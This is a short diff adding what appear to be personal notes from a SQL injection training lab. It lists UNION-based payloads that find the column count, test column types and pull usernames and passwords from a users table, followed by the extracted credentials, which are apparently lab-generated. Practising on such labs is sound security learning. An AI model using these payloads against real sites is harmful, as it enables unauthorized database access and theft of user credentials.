@@ -1,0 +1,17 @@
+
+' order by 3-- -> internal server error
+3-1 = 2
+
+select a, b from products where category='Gifts
+
+' UNION select 'a', NULL--
+' UNION select 'a', 'a'--
+
+' UNION select username, password from users --
+
+administrator
+	8qyw2teeg4yejrwk1ugg
+wiener
+	ere6wdr5khoa7qmnx3kd
+carlos
+	ycwkx25d5eqpattio7lr
